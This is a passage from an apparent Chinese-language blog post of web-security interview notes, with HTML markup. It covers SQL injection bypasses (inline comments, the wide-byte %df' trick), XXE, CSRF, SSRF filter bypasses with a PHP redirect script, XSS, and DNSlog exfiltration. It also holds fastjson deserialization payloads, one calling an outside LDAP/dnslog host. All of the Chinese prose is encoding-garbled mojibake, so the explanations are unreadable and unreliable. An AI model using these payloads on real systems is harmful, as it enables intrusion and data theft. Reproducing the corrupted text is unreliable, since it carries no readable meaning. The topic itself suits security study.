class="language-none">ÂÜÖËÅîÊ≥®ÈáäÂ∞±ÊòØÊää‰∏Ä‰∫õÁâπÊúâÁöÑ‰ªÖÂú®MYSQL‰∏äÁöÑËØ≠Âè•ÊîæÂú® &#x2F;!..&#x2F; ‰∏≠ÔºåËøô‰∫õËØ≠Âè•Â¶ÇÊûúÂú®ÂÖ∂ÂÆÉÊï∞ÊçÆÂ∫ì‰∏≠ÊòØ‰∏ç‰ºöË¢´ÊâßË°åËÄåÂú®SQLÊï∞ÊçÆÂ∫ì‰∏≠ÂèØË¢´ÊâßË°å select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="sqlÊ≥®ÂÖ•ËøáÊª§"><a href="#sqlÊ≥®ÂÖ•ËøáÊª§" class="headerlink" title="sqlÊ≥®ÂÖ•ËøáÊª§"></a>sqlÊ≥®ÂÖ•ËøáÊª§</h2><ol><li><strong>‰ΩøÁî®ÂèÇÊï∞ÂåñÊü•ËØ¢</strong>ÔºöÂèÇÊï∞ÂåñÊü•ËØ¢ÂèØ‰ª•Â∞ÜÁî®Êà∑ËæìÂÖ•ÂíåSQL‰ª£Á†ÅÂàÜÂºÄÔºå‰ªéËÄåÈÅøÂÖçSQLÊ≥®ÂÖ•ÊîªÂáª„ÄÇÈÄöËøá‰ΩøÁî®È¢ÑÁºñËØëËØ≠Âè•ÂíåÂèÇÊï∞ÂåñÊü•ËØ¢ËØ≠Âè•ÔºåÂ∫îÁî®Á®ãÂ∫èÂèØ‰ª•ÊääÁî®Êà∑ËæìÂÖ•ËΩ¨Âåñ‰∏∫ÂèÇÊï∞ÔºåËÄå‰∏çÊòØÁõ¥Êé•ÊãºÊé•Âà∞SQLËØ≠Âè•‰∏≠„ÄÇ</li><li><strong>ÂØπËæìÂÖ•ËøõË°åËøáÊª§ÂíåÈ™åËØÅ</strong>ÔºöÂú®Â∫îÁî®Á®ãÂ∫è‰∏≠ÂØπËæìÂÖ•Êï∞ÊçÆËøõË°åËøáÊª§ÂíåÈ™åËØÅÔºåÂèØ‰ª•ÊúâÊïàÂú∞ÂáèÂ∞ëSQLÊ≥®ÂÖ•ÊîªÂáªÁöÑÈ£éÈô©„ÄÇÂèØ‰ª•‰ΩøÁî®ÁôΩÂêçÂçïÊàñÈªëÂêçÂçïÊú∫Âà∂ÔºåËøáÊª§ÊéâÈùûÊ≥ïÂ≠óÁ¨¶ÊàñËØ≠Âè•ÔºåÊàñËÄÖÂØπËæìÂÖ•Êï∞ÊçÆËøõË°åÊ†ºÂºèÈ™åËØÅÂíåÈïøÂ∫¶ÈôêÂà∂„ÄÇ</li><li><strong>‰ΩøÁî®ORMÊ°ÜÊû∂</strong>Ôºö‰ΩøÁî®ORMÊ°ÜÊû∂ÂèØ‰ª•ÈÅøÂÖçÊâãÂä®ÊãºÊé•SQLËØ≠Âè•Ôºå‰ªéËÄåÂáèÂ∞ëSQLÊ≥®ÂÖ•ÊîªÂáªÁöÑÈ£éÈô©„ÄÇORMÊ°ÜÊû∂ÂèØ‰ª•Ëá™Âä®Â∞ÜÊï∞ÊçÆËΩ¨Êç¢‰∏∫ÂèÇÊï∞Ôºå‰ªéËÄåÈò≤Ê≠¢ÊÅ∂ÊÑèSQLÊ≥®ÂÖ•ÊîªÂáª„ÄÇ</li><li><strong>‰ΩøÁî®Èò≤ÁÅ´Â¢ô</strong>Ôºö‰ΩøÁî®WebÂ∫îÁî®Á®ãÂ∫èÈò≤ÁÅ´Â¢ôÂèØ‰ª•ÁõëÊµãÂíåÈò≤Ê≠¢SQLÊ≥®ÂÖ•ÊîªÂáª„ÄÇÈò≤ÁÅ´Â¢ôÂèØ‰ª•ÂØπËæìÂÖ•Êï∞ÊçÆËøõË°åÊ£ÄÊü•ÔºåËøáÊª§ÊéâÊÅ∂ÊÑèSQLËØ≠Âè•Ôºå‰ªéËÄå‰øùÊä§Â∫îÁî®Á®ãÂ∫è‰∏çÂèóÊîªÂáª„ÄÇ</li></ol><h2 id="SqlÊ≥®ÂÖ•ÂàÜÁ±ª"><a href="#SqlÊ≥®ÂÖ•ÂàÜÁ±ª" class="headerlink" title="SqlÊ≥®ÂÖ•ÂàÜÁ±ª"></a>SqlÊ≥®ÂÖ•ÂàÜÁ±ª</h2><p>Êä•ÈîôÊ≥®ÂÖ•„ÄÅÁõ≤Ê≥®„ÄÅÊó∂Èó¥Áõ≤Ê≥®„ÄÅ‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÂÆΩÂ≠óËäÇ,Â†ÜÂè†Ê≥®ÂÖ•Ôºåhttp headerÁöÑÊ≥®ÂÖ•ÔºåxffÔºåcookieÊ≥®ÂÖ•</p><h3 id="ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù°‰ª∂"><a href="#ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù°‰ª∂" class="headerlink" title="ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù°‰ª∂"></a><strong>ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù°‰ª∂</strong></h3><p>1.Êï∞ÊçÆÂ∫ì‰∏∫GBKÁºñÁ†Å<br> 2.‰ΩøÁî®‰∫ÜËΩ¨‰πâÂáΩÊï∞ÔºåÂ∞Ü„ÄÅPOGETST„ÄÅcookie‰º†ÈÄíÁöÑÂèÇÊï∞ËøõË°åËøáÊª§ÔºåÂ∞ÜÂçïÂºïÂè∑„ÄÅÂèåÂºïÂè∑„ÄÅnullÁ≠âÊïèÊÑüÂ≠óÁ¨¶Áî®ËΩ¨‰πâÁ¨¶  \  ËøõË°åËΩ¨‰πâ</p><h3 id="ÁªïËøáÊñπÂºè"><a href="#ÁªïËøáÊñπÂºè" class="headerlink" title="ÁªïËøáÊñπÂºè"></a><strong>ÁªïËøáÊñπÂºè</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span class="token comment"># ÂéüÁêÜ:Âú®GBKÁºñÁ†Å‰∏≠,ÂèçÊñúÊù†ÁöÑÁºñÁ†ÅÊòØ%5c,Âú®ËæìÂÖ•%dfÂêéÔºå‰ΩøÂæóÊ∑ªÂä†ÂèçÊñúÊù†ÂêéÂΩ¢Êàê%df%5cÔºåËÄå%df%5cÊòØÁπÅ‰ΩìÂ≠ó‚ÄúÈÄ£‚ÄùÔºåÂçïÂºïÂè∑ÊàêÂäüÈÄÉÈÄ∏ÔºåÁàÜÂá∫MysqlÊï∞ÊçÆÂ∫ìÁöÑÈîôËØØ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="SQL‰∫åÊ¨°Ê≥®ÂÖ•"><a href="#SQL‰∫åÊ¨°Ê≥®ÂÖ•" class="headerlink" title="SQL‰∫åÊ¨°Ê≥®ÂÖ•"></a>SQL‰∫åÊ¨°Ê≥®ÂÖ•</h2><p>‰∫åÊ¨°Ê≥®ÂÖ•ÁöÑÂéüÁêÜÔºåÂú®Á¨¨‰∏ÄÊ¨°ËøõË°åÊï∞ÊçÆÂ∫ìÊèíÂÖ•Êï∞ÊçÆÁöÑÊó∂ÂÄôÔºå‰ΩøÁî®‰∫Ü addslashes „ÄÅget_magic_quotes_gpc„ÄÅmysql_escape_string„ÄÅmysql_real_escape_stringÁ≠âÂáΩÊï∞ÂØπÂÖ∂‰∏≠ÁöÑÁâπÊÆäÂ≠óÁ¨¶ËøõË°å‰∫ÜËΩ¨‰πâÔºå‰ΩÜÊòØaddslashesÊúâ‰∏Ä‰∏™ÁâπÁÇπÂ∞±ÊòØËôΩÁÑ∂ÂèÇÊï∞Âú®ËøáÊª§Âêé‰ºöÊ∑ªÂä† ‚Äú\‚Äù ËøõË°åËΩ¨‰πâÔºå‰ΩÜÊòØ‚Äú\‚ÄùÂπ∂‰∏ç‰ºöÊèíÂÖ•Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÔºåÂú®ÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÁöÑÊó∂ÂÄôËøòÊòØ‰øùÁïô‰∫ÜÂéüÊù•ÁöÑÊï∞ÊçÆ„ÄÇÂú®Â∞ÜÊï∞ÊçÆÂ≠òÂÖ•Âà∞‰∫ÜÊï∞ÊçÆÂ∫ì‰∏≠‰πãÂêéÔºåÂºÄÂèëËÄÖÂ∞±ËÆ§‰∏∫Êï∞ÊçÆÊòØÂèØ‰ø°ÁöÑ„ÄÇÂú®‰∏ã‰∏ÄÊ¨°ËøõË°åÈúÄË¶ÅËøõË°åÊü•ËØ¢ÁöÑÊó∂ÂÄôÔºåÁõ¥Êé•‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ÂèñÂá∫‰∫ÜËÑèÊï∞ÊçÆÔºåÊ≤°ÊúâËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÊ£ÄÈ™åÂíåÂ§ÑÁêÜÔºåËøôÊ†∑Â∞±‰ºöÈÄ†ÊàêSQLÁöÑ‰∫åÊ¨°Ê≥®ÂÖ•„ÄÇ<br>ÊØîÂ¶ÇÂú®Á¨¨‰∏ÄÊ¨°ÊèíÂÖ•Êï∞ÊçÆÁöÑÊó∂ÂÄôÔºåÊï∞ÊçÆ‰∏≠Â∏¶ÊúâÂçïÂºïÂè∑ÔºåÁõ¥Êé•ÊèíÂÖ•Âà∞‰∫ÜÊï∞ÊçÆÂ∫ì‰∏≠ÔºõÁÑ∂ÂêéÂú®‰∏ã‰∏ÄÊ¨°‰ΩøÁî®‰∏≠Âú®ÊãºÂáëÁöÑËøáÁ®ã‰∏≠ÔºåÂ∞±ÂΩ¢Êàê‰∫Ü‰∫åÊ¨°Ê≥®ÂÖ•„ÄÇ</p><h2 id="SQLÊä•ÈîôÊ≥®ÂÖ•"><a href="#SQLÊä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="SQLÊä•ÈîôÊ≥®ÂÖ•"></a>SQLÊä•ÈîôÊ≥®ÂÖ•</h2><p>ÂáΩÊï∞Ôºö</p><p>floor()ÂáΩÊï∞Ôºå</p><p>exp()ÂáΩÊï∞Ôºå</p><p>convert()ÂáΩÊï∞Ôºå</p><p>updataxml()ÂáΩÊï∞ÔºåËøîÂõûÊï∞ÊçÆÈïøÂ∫¶&lt;32‰Ωç</p><p>name_const()ÂáΩÊï∞Ôºå</p><p>extractvalue()ÂáΩÊï∞ÔºöËøîÂõûÊï∞ÊçÆÈïøÂ∫¶&lt;32‰Ωç</p><h2 id="XXEÊºèÊ¥ûÔºàÂç≥XMlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ"><a href="#XXEÊºèÊ¥ûÔºàÂç≥XMlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ" class="headerlink" title="XXEÊºèÊ¥ûÔºàÂç≥XMlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ"></a>XXEÊºèÊ¥ûÔºàÂç≥XMlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ</h2><p><strong>XXE</strong>ÊºèÊ¥ûËß¶ÂèëÁÇπÂæÄÂæÄÊòØÂèØ‰ª•‰∏ä‰º†xmlÊñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºåÊ≤°ÊúâÂØπxmlÊñá‰ª∂ËøõË°åËøáÊª§ÔºåÂØºËá¥ÂèØÂä†ËΩΩÊÅ∂ÊÑèÂ§ñÈÉ®Êñá‰ª∂Âíå‰ª£Á†ÅÔºåÈÄ†Êàê‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåÂëΩ‰ª§ÊâßË°å„ÄÅÂÜÖÁΩëÁ´ØÂè£Êâ´Êèè„ÄÅÊîªÂáªÂÜÖÁΩëÁΩëÁ´ô„ÄÅÂèëËµ∑DosÊîªÂáªÁ≠âÂç±ÂÆ≥</p><h2 id="ÊÄé‰πàÂà§Êñ≠ÁΩëÁ´ôÊòØÂê¶Â≠òÂú®XXEÊºèÊ¥û"><a href="#ÊÄé‰πàÂà§Êñ≠ÁΩëÁ´ôÊòØÂê¶Â≠òÂú®XXEÊºèÊ¥û" class="headerlink" title="ÊÄé‰πàÂà§Êñ≠ÁΩëÁ´ôÊòØÂê¶Â≠òÂú®XXEÊºèÊ¥û"></a>ÊÄé‰πàÂà§Êñ≠ÁΩëÁ´ôÊòØÂê¶Â≠òÂú®XXEÊºèÊ¥û</h2><p>ÊúÄÁõ¥Êé•ÁöÑÊñπÊ≥ïÂ∞±ÊòØÁî®burpÊäìÂåÖÔºåÁÑ∂ÂêéÔºå‰øÆÊîπHTTPËØ∑Ê±ÇÊñπÊ≥ïÔºå‰øÆÊîπContent-TypeÂ§¥ÈÉ®Â≠óÊÆµÁ≠âÁ≠âÔºåÊü•ÁúãËøîÂõûÂåÖÁöÑÂìçÂ∫îÔºåÁúãÁúãÂ∫îÁî®Á®ãÂ∫èÊòØÂê¶Ëß£Êûê‰∫ÜÂèëÈÄÅÁöÑÂÜÖÂÆπÔºå‰∏ÄÊó¶Ëß£Êûê‰∫ÜÔºåÈÇ£‰πàÊúâÂèØËÉΩXXEÊîªÂáªÊºèÊ¥û</p><h2 id="CSRFÊîªÂáªÂéüÁêÜ"><a href="#CSRFÊîªÂáªÂéüÁêÜ" class="headerlink" title="CSRFÊîªÂáªÂéüÁêÜ"></a>CSRFÊîªÂáªÂéüÁêÜ</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p><ol><li>Áî®Êà∑ËæìÂÖ•Ë¥¶Âè∑‰ø°ÊÅØËØ∑Ê±ÇÁôªÂΩïAÁΩëÁ´ô„ÄÇ</li><li>AÁΩëÁ´ôÈ™åËØÅÁî®Êà∑‰ø°ÊÅØÔºåÈÄöËøáÈ™åËØÅÂêéËøîÂõûÁªôÁî®Êà∑‰∏Ä‰∏™cookie</li><li>Âú®Êú™ÈÄÄÂá∫ÁΩëÁ´ôA‰πãÂâçÔºåÂú®Âêå‰∏ÄÊµèËßàÂô®‰∏≠ËØ∑Ê±Ç‰∫ÜÈªëÂÆ¢ÊûÑÈÄ†ÁöÑÊÅ∂ÊÑèÁΩëÁ´ôB</li><li>BÁΩëÁ´ôÊî∂Âà∞Áî®Êà∑ËØ∑Ê±ÇÂêéËøîÂõûÊîªÂáªÊÄß‰ª£Á†ÅÔºåÊûÑÈÄ†ËÆøÈóÆAÁΩëÁ´ôÁöÑËØ≠Âè•</li><li>ÊµèËßàÂô®Êî∂Âà∞ÊîªÂáªÊÄß‰ª£Á†ÅÂêéÔºåÂú®Áî®Êà∑‰∏çÁü•ÊÉÖÁöÑÊÉÖÂÜµ‰∏ãÊê∫Â∏¶cookie‰ø°ÊÅØËØ∑Ê±Ç‰∫ÜAÁΩëÁ´ô„ÄÇÊ≠§Êó∂AÁΩëÁ´ô‰∏çÁü•ÈÅìËøôÊòØÁî±BÂèëËµ∑ÁöÑ„ÄÇÈÇ£‰πàËøôÊó∂ÈªëÂÆ¢Â∞±ÂèØ‰ª•ËøõË°å‰∏Ä‰∏ãÈ™öÊìç‰Ωú‰∫ÜÔºÅ</li></ol><p>‰∏§‰∏™Êù°‰ª∂Ôºöa Áî®Êà∑ËÆøÈóÆÁ´ôÁÇπAÂπ∂‰∫ßÁîü‰∫Ücookie</p><p>b Áî®Êà∑Ê≤°ÊúâÈÄÄÂá∫AÂêåÊó∂ËÆøÈóÆ‰∫ÜB</p><h2 id="SSRFÊºèÊ¥ûÔºàÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†Ôºâ"><a href="#SSRFÊºèÊ¥ûÔºàÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†Ôºâ" class="headerlink" title="SSRFÊºèÊ¥ûÔºàÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†Ôºâ"></a>SSRFÊºèÊ¥ûÔºàÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†Ôºâ</h2><p>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºåSSRFÊîªÂáªÁöÑÁõÆÊ†áÊòØ‰ªéÂ§ñÁΩëÊó†Ê≥ïËÆøÈóÆÁöÑÂÜÖÈÉ®Á≥ªÁªü„ÄÇ</p><p>‰ªéÊåáÂÆöURLÂú∞ÂùÄËé∑ÂèñÁΩëÈ°µÊñáÊú¨ÂÜÖÂÆπÔºåÂä†ËΩΩÊåáÂÆöÂú∞ÂùÄÁöÑÂõæÁâáÔºå‰∏ãËΩΩÁ≠âÁ≠â„ÄÇ</p><p>Âà©Áî®ÁöÑÊòØÊúçÂä°Á´ØÁöÑËØ∑Ê±Ç‰º™ÈÄ†„ÄÇ</p><p>SSRFÊòØÂà©Áî®Â≠òÂú®Áº∫Èô∑ÁöÑwebÂ∫îÁî®‰Ωú‰∏∫‰ª£ÁêÜÊîªÂáªËøúÁ®ãÂíåÊú¨Âú∞ÁöÑÊúçÂä°Âô®„ÄÇ</p><h3 id="ÁªïËøáÊñπÂºè-1"><a href="#ÁªïËøáÊñπÂºè-1" class="headerlink" title="ÁªïËøáÊñπÂºè"></a>ÁªïËøáÊñπÂºè</h3><p><strong>1.@Á¨¶Âè∑ÁªïËøáÔºö</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Âú®ÊüêÂú∞ÂùÄ1ÂêéÊ∑ªÂä†@ÂÜçÊ¨°Ê∑ªÂä†Âú∞ÂùÄ2ÔºåÊµèËßàÂô®‰ºöËá™Âä®ËøîÂõûÂú∞ÂùÄ2Êï∞ÊçÆ</p><p><strong>2.IPÂú∞ÂùÄËΩ¨Êç¢Ôºö</strong></p><p>ÂØπÂÜÖÁΩëËØ∑Ê±ÇÁöÑIPÂú∞ÂùÄËøõË°åÂêÑËøõÂà∂ÁöÑÁºñÁ†Å</p><p><strong>3.ËΩ¨Êç¢Áü≠ÁΩëÂùÄÔºö</strong></p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;‰æãÔºöhttp:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>4.ÁâπÊÆäÁ¨¶Âè∑ÊõøÊç¢ÁªïËøáÔºö</strong></p><pre class="line-numbers language-none"><code class="language-none">‰æãÔºöhttp:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;www„ÄÇkxsy„ÄÇwork&#x2F;localhostÊàñËÄÖ0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5.302Ë∑≥ËΩ¨ÁªïËøáÔºö</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  $schema &#x3D; $_GET[&#39;s&#39;];$ip     &#x3D; $_GET[&#39;i&#39;];$port   &#x3D; $_GET[&#39;p&#39;];$query  &#x3D; $_GET[&#39;q&#39;];if(empty($port))&#123;      header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); &#125; else &#123;    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6.xip.ioÁªïËøáÔºö‰ºöÂ∞ÜËß£ÊûêÂà∞Â≠êÂüü</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>8.ÂÖ∂‰ªñÂçèËÆÆÁªïËøá Ôºö</strong></p><p>ÈÖçÂêàFile„ÄÅ GOPHERÁ≠âÂçèËÆÆÁöÑÂØπÁõÆÊ†áËøõË°å‰ø°ÊÅØÊé¢Êµã</p><h2 id="XSSÔºàË∑®Á´ôÁÇπËÑöÊú¨ÊîªÂáªÔºâ"><a href="#XSSÔºàË∑®Á´ôÁÇπËÑöÊú¨ÊîªÂáªÔºâ" class="headerlink" title="XSSÔºàË∑®Á´ôÁÇπËÑöÊú¨ÊîªÂáªÔºâ"></a>XSSÔºàË∑®Á´ôÁÇπËÑöÊú¨ÊîªÂáªÔºâ</h2><p>ÊúçÂä°Âô®ÂØπÁî®Êà∑Êèê‰∫§ÁöÑÊï∞ÊçÆËøáÊª§‰∏ç‰∏•ÔºåÂØºËá¥ÊµèËßàÂô®ÊääÁî®Êà∑ÁöÑËæìÂÖ•ÂΩìÊàê‰∫ÜJS‰ª£Á†ÅÂπ∂Áõ¥Êé•ËøîÂõûÁªôÂÆ¢Êà∑Á´ØÊâßË°åÔºå‰ªéËÄåÂÆûÁé∞<strong>ÂØπÂÆ¢Êà∑Á´ØÁöÑÊîªÂáª</strong>ÁõÆÁöÑ„ÄÇ</p><p>ÂèçÂ∞ÑÂûãXSS</p><p>Â≠òÂÇ®ÂûãXSS</p><p>DOMÂûãXSSÔºöDOM-XSSÊòØÈÄöËøáurl‰º†ÂÖ•ÂèÇÊï∞ÂéªÊéßÂà∂Ëß¶ÂèëÁöÑÔºåÂÖ∂ÂÆû‰πüÂ±û‰∫éÂèçÂ∞ÑÂûãXSS„ÄÇ</p><h2 id="xss‰∏écsrfÁöÑÂå∫Âà´"><a href="#xss‰∏écsrfÁöÑÂå∫Âà´" class="headerlink" title="xss‰∏écsrfÁöÑÂå∫Âà´"></a>xss‰∏écsrfÁöÑÂå∫Âà´</h2><p>**xssÔºöË∑®Á´ôËÑöÊú¨ÊîªÂáª„ÄÅËØ±È™óÁî®Êà∑ÁÇπÂáªÊÅ∂ÊÑèÈìæÊé•ÁõóÂèñÁî®Êà∑cookieËøõË°åÊîªÂáª„ÄÅ‰∏çÈúÄË¶ÅÁî®Êà∑ËøõË°åÁôªÂΩï„ÄÅxssÈô§‰∫ÜÂà©Áî®cookieËøòÂèØ‰ª•ÁØ°ÊîπÁΩëÈ°µÁ≠â. **</p><p><strong>csrfÔºöË∑®Á´ôËØ∑Ê±Ç‰º™ÈÄ†„ÄÅÊó†Ê≥ïËé∑ÂèñÁî®Êà∑ÁöÑcookieËÄåÊòØÁõ¥Êé•ÂÜíÂÖÖÁî®Êà∑„ÄÅÈúÄË¶ÅÁî®Êà∑ÁôªÂΩïÂêéËøõË°åÊìç‰Ωú</strong></p><h2 id="Âì™Èáå‰ΩøÁî®Âà∞‰∫ÜdnslogÂ§ñÂ∏¶"><a href="#Âì™Èáå‰ΩøÁî®Âà∞‰∫ÜdnslogÂ§ñÂ∏¶" class="headerlink" title="Âì™Èáå‰ΩøÁî®Âà∞‰∫ÜdnslogÂ§ñÂ∏¶"></a>Âì™Èáå‰ΩøÁî®Âà∞‰∫ÜdnslogÂ§ñÂ∏¶</h2><h3 id="DNSlogÂ§ñÂ∏¶ÂéüÁêÜÔºö"><a href="#DNSlogÂ§ñÂ∏¶ÂéüÁêÜÔºö" class="headerlink" title="DNSlogÂ§ñÂ∏¶ÂéüÁêÜÔºö"></a>DNSlogÂ§ñÂ∏¶ÂéüÁêÜÔºö</h3><p>DNSÂú®Ëß£ÊûêÁöÑÊó∂ÂÄô‰ºöÁïô‰∏ãÊó•ÂøóÔºåÊàë‰ª¨Â∞Ü‰ø°ÊÅØÊîæÂú®È´òÁ∫ßÂüüÂêç‰∏≠Ôºå‰º†ÈÄíÂà∞Ëá™Â∑±ËøôÈáåÔºåÁÑ∂ÂêéÈÄöËøáËØªÊó•ÂøóËé∑Âèñ‰ø°ÊÅØ„ÄÇ</p><h3 id="SQLÁõ≤Ê≥®"><a href="#SQLÁõ≤Ê≥®" class="headerlink" title="SQLÁõ≤Ê≥®"></a>SQLÁõ≤Ê≥®</h3><p>Áõ≤Ê≥®ÈúÄË¶ÅÈ¢ëÁπÅËØ∑Ê±ÇÊâçËÉΩËé∑ÂèñÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÂÄºÔºåÂú®ÊúâwafÁöÑÊÉÖÂÜµ‰∏ãÂæàÂÆπÊòìË¢´ban ip„ÄÇËøôÁßçÊÉÖÂÜµ‰∏ãÂèØ‰ª•ÁªìÂêàDNSLogÂ∞ÜÊï∞ÊçÆÂèñÂá∫„ÄÇ<strong>Â¶ÇÊûúÈÅáÂà∞MySQLÁöÑÁõ≤Ê≥®ÔºåÂèØ‰ª•Âà©Áî®ÂÜÖÁΩÆÂáΩÊï∞load_file()Êù•ÂÆåÊàêDNSLog„ÄÇload_file()‰∏ç‰ªÖËÉΩÂ§üÂä†ËΩΩÊú¨Âú∞Êñá‰ª∂ÔºåÂêåÊó∂‰πüËÉΩÂØπËØ∏Â¶Ç<code>www.baidu.com</code>ËøôÊ†∑ÁöÑurlÂèëËµ∑ËØ∑Ê±Ç</strong></p><h3 id="Êó†ÂõûÊòæÁöÑSSRF"><a href="#Êó†ÂõûÊòæÁöÑSSRF" class="headerlink" title="Êó†ÂõûÊòæÁöÑSSRF"></a>Êó†ÂõûÊòæÁöÑSSRF</h3><p>Â∞ÜurlÊç¢ÊàêÊàë‰ª¨ÁöÑDNSÊúçÂä°Âô®ÔºåÈÄöËøáÊü•ÁúãDNSLogÂπ≥Âè∞Êó•ÂøóÊü•ÁúãÊòØÂê¶ÊúâÊúçÂä°Âô®ipÂà§Êñ≠ÊòØÂê¶ÊúâssrfÊºèÊ¥û</p><h3 id="xssÁõ≤Êâì"><a href="#xssÁõ≤Êâì" class="headerlink" title="xssÁõ≤Êâì"></a>xssÁõ≤Êâì</h3><p>xssÁõ≤ÊâìÊòØÊåáÂú®ÊîªÂáªËÄÖÂØπÊï∞ÊçÆÊèê‰∫§ÂêéÂ±ïÁé∞ÁöÑÂêéÂè∞Êú™Áü•ÁöÑÊÉÖÂÜµ‰∏ãÔºåÁΩëÁ´ôÈááÁî®‰∫ÜÊîªÂáªËÄÖÊèíÂÖ•ÁöÑÂ∏¶ÊúâÁúüÂÆûÊîªÂáªË°å‰∏∫ÁöÑxss‰ª£Á†ÅÊï∞ÊçÆ„ÄÇÂΩìÊú™Áü•ÂêéÂè∞Âú®Â±ïÁé∞Êó∂Ê≤°ÊúâÂØπËøô‰∫õÊèê‰∫§ÁöÑÊï∞ÊçÆËøõË°åËøáÊª§ÔºåÈÇ£‰πàÂêéÂè∞ÁÆ°ÁêÜ‰∫∫ÂëòÂú®Êìç‰ΩúÊó∂Â∞±‰ºöËß¶ÂèëxssÊù•ÂÆûÁé∞ÊîªÂáªËÄÖÈ¢ÑÂÆöÂ•ΩÁöÑÁúüÂÆûÊîªÂáªÂäüËÉΩ„ÄÇ</p><h3 id="log4jÊºèÊ¥û"><a href="#log4jÊºèÊ¥û" class="headerlink" title="log4jÊºèÊ¥û"></a>log4jÊºèÊ¥û</h3><h3 id="fastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#fastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="fastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û"></a>fastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û</h3><p>ÊûÑÈÄ†‰ª•‰∏ãpayloadÔºàcontent-typeÂ≠óÊÆµ‰∏∫application&#x2F;jsonÔºâÔºåÂà©Áî®dnslogÂπ≥Âè∞Êé•Êî∂Ôºö{‚Äúzeo‚Äù:{‚Äú@type‚Äù:‚Äùjava.net.Inet4Address‚Äù,‚Äùval‚Äù:‚Äùntel8h.dnslog.cn‚Äù}}Ôºà‰∏çÂêåÁâàÊú¨Ôºåpayload‰∏çÂêå„ÄÇÊé®ËçêËøôÁßçÊñπÂºèÔºâ</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLogÁöÑÁªºÂêàÂà©Áî® (qq.com)</a></p><h2 id="ÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#ÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="ÂèçÂ∫èÂàóÂåñÊºèÊ¥û"></a>ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</h2><h3 id="weblogicÊºèÊ¥û"><a href="#weblogicÊºèÊ¥û" class="headerlink" 